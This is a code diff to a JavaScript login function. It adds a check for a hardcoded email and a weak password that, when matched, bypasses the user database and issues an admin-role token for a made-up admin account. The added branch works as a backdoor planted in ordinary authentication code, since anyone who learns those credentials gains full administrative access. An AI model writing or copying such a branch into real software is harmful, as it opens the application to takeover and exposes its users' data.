@@ -89,6 +89,14 @@ const registerUser = async ({ name, email, password }) => {
 };
 
 const loginUser = async ({ email, password }) => {
+  // Hardcoded admin credentials check
+  if (email === 'admin123@gmail.com' && password === 'admin12345') {
+    const adminUser = { id: 'admin-id', name: 'Admin', email, role: 'admin' };
+    const token = generateToken(adminUser);
+    return { user: adminUser, token };
+  }
+
+  // Regular user lookup
   const user = await model.findUserByEmail(email);
   if (!user) {
     const error = new Error('Invalid email or password.');
